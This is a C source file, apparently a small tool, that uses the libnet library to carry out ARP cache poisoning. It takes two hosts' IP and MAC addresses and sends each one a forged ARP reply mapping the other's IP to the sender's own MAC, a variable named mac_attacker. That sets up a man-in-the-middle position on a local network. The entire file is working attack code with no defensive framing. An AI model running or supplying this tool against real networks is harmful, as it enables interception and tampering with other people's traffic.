#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>

void	get_args(int ac, char **av, libnet_t *l, u_int32_t *ip_src,
		u_int8_t **mac_src, u_int32_t *ip_target, u_int8_t **mac_target)
{
	int	len;

	if (ac != 5)
	{
		printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target>\n", 
				av[0]);
		exit(0);
	}

	*ip_src = libnet_name2addr4(l, av[1], LIBNET_DONT_RESOLVE);
	if (*ip_src == -1) {
		fprintf(stderr, "Error converting IP source address.\n");
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	*mac_src = libnet_hex_aton(av[2], &len);
	if (!*mac_src) {
		fprintf(stderr, "Error converting MAC source address.\n");
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	*ip_target = libnet_name2addr4(l, av[3], LIBNET_DONT_RESOLVE);
	if (*ip_target == -1) {
		fprintf(stderr, "Error converting IP target address.\n");
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	*mac_target = libnet_hex_aton(av[4], &len);
	if (!*mac_target) {
		fprintf(stderr, "Error converting MAC target address.\n");
		libnet_destroy(l);
		free(*mac_src);
		exit(EXIT_FAILURE);
	}
}

u_int8_t	*get_own_mac(libnet_t *l)
{
	struct libnet_ether_addr	*mac_addr;

	mac_addr = libnet_get_hwaddr(l);
	if (!mac_addr) {
		fprintf(stderr, "Couldn't get own IP address: %s\n",
				libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	
	return (mac_addr->ether_addr_octet);
}

void	send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
		u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l)
{
	u_int8_t	mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};

	// Building ARP header
	if (libnet_autobuild_arp( ARPOP_REPLY, sender_mac,
				(u_int8_t *)(&sender_ip),
				mac_zero_addr, (u_int8_t *)(&target_ip), l) == -1)
	{
		fprintf(stderr, "Error building ARP header: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	// Building Ethernet header
	if (libnet_autobuild_ethernet(target_mac, ETHERTYPE_ARP, l) == -1)
	{
		fprintf(stderr, "Error building Ethernet header: %s\n",
				libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	// Writing packet
	int bytes_written;
	bytes_written = libnet_write(l);
	if (bytes_written == -1)
		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
}

int main(int ac, char **av)
{
	libnet_t	*l;
	char		errbuf[LIBNET_ERRBUF_SIZE];
	u_int32_t	ip_src;
	u_int8_t	*mac_src;
	u_int32_t	ip_target;
	u_int8_t	*mac_target;
	u_int8_t	*mac_attacker;

	l = libnet_init(LIBNET_LINK, NULL, errbuf);
	if (!l) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	get_args(ac, av, l, &ip_src, &mac_src, &ip_target, &mac_target);
	mac_attacker = get_own_mac(l);

	send_gratuitous_arp(mac_attacker, ip_src, mac_target, ip_target, l);
	send_gratuitous_arp(mac_attacker, ip_target, mac_src, ip_src, l);

	/*
	printf("ip_src: %s\nmac_src: %x:%x\n", libnet_addr2name4(ip_src, LIBNET_DONT_RESOLVE), mac_src[0], mac_src[1]);
	printf("ip_target: %d\nmac_target: %x:%x\n", ip_target, mac_target[0], mac_target[1]);
	printf("mac_attacker: %02x:%02x:%02x:%02x:%02x:%02x\n", mac_attacker[0], mac_attacker[1], mac_attacker[2], mac_attacker[3], mac_attacker[4], mac_attacker[5]);
	*/

	free(mac_src);
	free(mac_target);
	libnet_destroy(l);
}
